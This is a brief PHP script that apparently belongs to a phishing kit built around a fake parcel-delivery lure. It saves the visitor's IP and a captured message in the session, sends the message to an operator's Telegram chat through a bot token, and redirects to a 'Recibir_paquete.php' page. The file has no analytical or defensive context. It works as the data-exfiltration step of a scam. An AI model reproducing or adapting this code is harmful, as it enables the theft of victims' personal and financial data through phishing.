<?php

include "./inc/app.php";
require_once "./settings/conf.php";




$_SESSION["IP"] = $Visit[0];
$_SESSION["msg"] = $_message;

TG_send($_message, TELEGRAM_TOKEN,TELEGRAM_CHAT_ID);
//TG_send($message, TELEGRAM_TOKEN, TELEGRAM_CHAT_IDD);



header("Location: Recibir_paquete.php");

?>